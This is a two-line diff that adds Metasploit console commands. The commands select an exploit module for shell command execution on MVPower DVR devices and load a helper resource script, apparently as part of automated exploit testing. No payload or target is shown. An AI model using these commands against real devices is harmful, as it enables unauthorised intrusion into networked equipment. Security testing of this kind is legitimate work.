@@ -1,0 +1,2 @@
+use exploits/linux/http/mvpower_dvr_shell_exec
+resource stub_http_explt_rhost.rb
